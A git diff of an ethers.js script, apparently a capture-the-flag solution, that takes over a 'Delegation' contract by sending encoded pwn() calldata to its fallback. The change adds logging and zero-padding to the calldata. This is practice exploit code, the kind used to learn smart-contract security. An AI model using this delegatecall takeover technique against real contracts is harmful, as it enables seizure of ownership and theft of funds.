@@ -48,11 +48,20 @@ const attackDelegation = async () => {
     const iface = new ethers.utils.Interface(["function pwn()"]);
     const signature = iface.encodeFunctionData("pwn");
     // sending transaction here
+    console.log(signature);
+    // converting to bytes4
+    // adding zeros before
+    // console.log("Converting encoded signature to bytes...");
+    // const data = ethers.utils.hexZeroPad(ethers.utils.hexlify(signature), 32);
+    // console.log(data);
+    console.log("Converting encoded signature to bytes...");
+    const data = signature + "00".repeat(32);
+    console.log(data);
     console.log("Now sending transaction to call fallback ...");
     const tx = await wallet.sendTransaction({
         from: player,
         to: delegationAddress,
-        data: signature,
+        data: data,
     });
     console.log(tx);
     const txReceipt = await tx.wait(1);
